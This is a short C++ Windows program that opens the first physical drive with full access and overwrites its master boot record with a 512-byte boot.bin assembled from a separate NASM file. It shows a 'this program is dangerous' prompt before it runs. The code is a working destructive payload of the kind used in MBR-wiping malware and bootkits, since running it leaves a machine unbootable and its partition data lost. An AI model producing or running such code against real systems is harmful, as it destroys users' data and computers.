#include <windows.h>
#include <winioctl.h>
#include <iostream>
#include <string>
#include <cstdio>

int main()
{
    // Confirmation
    std::string confirmation = "no";
    std::cout << "This program is dangerous! Are you sure that you want to run this?\n";
    std::cout << "Please type 'yes' or type 'no'\n>";
    std::cin >> confirmation;

    if (confirmation != "yes")
    {
        printf("Exiting program...\n");
        return -1;
    }

    // Overwrite
    HANDLE drive = CreateFileW(
        L"\\\\.\\PhysicalDrive0",
        GENERIC_ALL,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        0,
        OPEN_EXISTING,
        0,
        0
    );

    if (drive == INVALID_HANDLE_VALUE)
    {
        printf("Error opening a handle to the drive.\n");
        return -1;
    }

    HANDLE binary = CreateFileW(
        L"./boot.bin",
        GENERIC_READ,
        0,
        0,
        OPEN_EXISTING,
        0,
        0
    );

    if (binary == INVALID_HANDLE_VALUE)
    {
        printf("Error opening boot.bin\n");
        CloseHandle(drive);
        return -1;
    }

    DWORD size = GetFileSize(binary, 0);

    if (size != 512)
    {
        printf("boot.bin must be exactly 512 bytes\n");
        CloseHandle(binary);
        CloseHandle(drive);
        return -1;
    }

    BYTE* new_mbr = new BYTE[size];
    DWORD bytes_read = 0;

    if (ReadFile(binary, new_mbr, size, &bytes_read, 0))
    {
        if (WriteFile(drive, new_mbr, size, &bytes_read, 0))
        {
            printf("First sector overwritten successfully!\n");
        }
        else
        {
            printf("Error writing to drive.\n");
        }
    }
    else
    {
        printf("Error reading boot.bin\n");
        printf("Make sure to compile the ASM file with:\n");
        printf("nasm -f bin -o boot.bin boot.asm\n");
    }

    delete[] new_mbr;
    CloseHandle(binary);
    CloseHandle(drive);

    std::getchar();
    return 0;
}
